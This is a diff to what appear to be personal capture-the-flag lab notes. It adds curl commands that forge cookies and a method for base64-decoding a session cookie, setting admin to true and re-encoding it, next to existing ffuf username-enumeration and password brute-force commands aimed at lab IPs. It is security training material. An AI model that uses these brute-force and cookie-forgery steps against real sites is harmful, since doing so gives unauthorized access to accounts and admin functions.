@@ -2,6 +2,14 @@ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "user
 
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.201.242/customers/login -fc 200
 
+curl http://10.10.61.140/cookie-test
+curl -H "Cookie: logged_in=true; admin=false" http://10.10.61.140/cookie-test
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.61.140/cookie-test
+Take the below data as an example which is set by the web server upon logging in:
+
+Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
+This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.
+
 
 Room : Rootme
 IP: 10.10.XXX.XXX
